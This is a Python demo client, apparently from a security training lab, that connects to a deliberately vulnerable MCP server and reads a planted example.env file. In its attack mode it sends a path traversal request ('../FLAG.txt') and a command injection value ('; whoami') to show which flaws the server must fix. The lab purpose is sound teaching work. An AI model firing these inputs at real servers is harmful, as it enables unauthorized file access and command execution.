#!/usr/bin/env python
"""client_http_demo.py — a raw MCP client over the network (no agent, no guardrail).

Two modes:
  (default)  Task 2 "peer" demo — discover tools, read a normal file, then read the planted
             example.env (the reveal: the server reads whatever the PROCESS can read).
  --attack   Task 3 proof — fire the server-side attacks (path traversal + command injection)
             DIRECTLY at the server. Because this is a raw client (not your Claude Code agent),
             there's no PreToolUse guardrail in the way — so it shows the SERVER's real behavior.

Start the server first (in another terminal):  python server/my_masterschool_mcp_server.py --http

Then run this:
    python client_http_demo.py                                   # peer demo vs localhost
    python client_http_demo.py http://<PARTNER-LAN-IP>:8000/mcp  # peer demo vs a partner / tunnel URL
    python client_http_demo.py --attack                          # attack localhost (add count_lines first!)
    python client_http_demo.py http://127.0.0.1:8000/mcp --attack
"""
import asyncio
import os
import sys

from mcp import ClientSession
from mcp.client.streamable_http import streamablehttp_client


def _text(result) -> str:
    return "\n".join(
        c.text for c in result.content if getattr(c, "type", None) == "text"
    )


def _ran_standalone(output: str, token: str) -> bool:
    """True only if `token` is a line of its OWN — i.e. a command actually produced it
    (guards against the username merely appearing inside an echoed path in an error)."""
    return bool(token) and any(line.strip() == token for line in output.splitlines())


async def main(url: str) -> None:
    print(f"\n[peer-client] connecting to {url}")
    print("[peer-client] (this is what a teammate's agent does to YOUR machine)\n")
    async with streamablehttp_client(url) as (read, write, _get_session_id):
        async with ClientSession(read, write) as session:
            await session.initialize()

            tools = await session.list_tools()
            print("[peer-client] discovered tools:", [t.name for t in tools.tools])

            print("\n[peer-client] reading a normal file: workspace/README.md")
            r = await session.call_tool(
                "read_workspace_file", {"path": "workspace/README.md"}
            )
            print("   " + _text(r).replace("\n", "\n   "))

            print(
                "\n[peer-client] THE REVEAL — asking for the planted secret: example.env"
            )
            r2 = await session.call_tool("read_workspace_file", {"path": "example.env"})
            print("   " + _text(r2).replace("\n", "\n   "))

    print(
        "\n[boundary] You just read a file on another machine. The boundary you crossed:"
    )
    print(
        "           the tool reads with the SERVER PROCESS's permissions — not 'the workspace'."
    )
    print(
        "           Anything that process can open is reachable by a stranger's agent.\n"
    )


async def attack(url: str) -> None:
    print(f"\n[attacker] connecting to {url}  (raw client — NO agent, NO guardrail)\n")
    async with streamablehttp_client(url) as (read, write, _get_session_id):
        async with ClientSession(read, write) as session:
            await session.initialize()
            names = [t.name for t in (await session.list_tools()).tools]
            print("[attacker] tools:", names)

            # 🚩 Flag 1 — path traversal
            print("\n🚩 Flag 1 — path traversal:  read_workspace_file('../FLAG.txt')")
            try:
                r = await session.call_tool(
                    "read_workspace_file", {"path": "../FLAG.txt"}
                )
                first = (_text(r).strip().splitlines() or ["(empty)"])[0]
                print(f"   LEAKED  — read a file outside the workspace: {first}")
            except Exception as e:
                print(f"   DEFENDED — server refused: {e}")

            # 🚩 Flag 2 — command injection
            print(
                "\n🚩 Flag 2 — command injection:  count_lines('workspace/notes.txt; whoami')"
            )
            if "count_lines" not in names:
                print(
                    "   (no count_lines tool on this server — add it first; see Task 3, Flag 2)"
                )
            else:
                me = os.popen("whoami").read().strip()
                r = await session.call_tool(
                    "count_lines", {"filename": "workspace/notes.txt; whoami"}
                )
                out = _text(r)
                print("   " + out.replace("\n", "\n   "))
                if _ran_standalone(out, me):
                    print(f"   PWNED   — injected `whoami` executed -> {me}")
                else:
                    print("   DEFENDED — no shell to inject into; `whoami` never ran")

    print(
        "\n[note] No agent in the loop here, so no client-side guardrail caught this —"
    )
    print(
        "       what you saw is the SERVER's own behavior. Harden the server (Round B).\n"
    )


if __name__ == "__main__":
    attack_mode = "--attack" in sys.argv
    urls = [a for a in sys.argv[1:] if not a.startswith("--")]
    target = urls[0] if urls else "http://127.0.0.1:8000/mcp"
    asyncio.run(attack(target) if attack_mode else main(target))
